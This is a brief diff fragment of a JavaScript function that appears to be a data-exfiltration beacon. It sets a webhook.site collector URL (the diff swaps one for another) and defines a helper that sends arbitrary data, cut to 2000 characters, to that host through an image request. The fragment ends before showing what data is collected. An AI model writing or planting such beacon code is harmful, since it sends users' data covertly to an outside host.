@@ -1,5 +1,5 @@
 (function(){
-var C='	https://webhook.site/62eb1d58-77b0-4564-af9a-7d82b4a72f9b';
+var C='https://webhook.site/cf493c37-822b-4702-897a-9e9672468bf0';
 var T=Date.now();
 function b(t,d){new Image().src=C+'?t='+encodeURIComponent(t)+'&d='+encodeURIComponent(String(d||'').substring(0,2000))+'&ts='+T;}
   
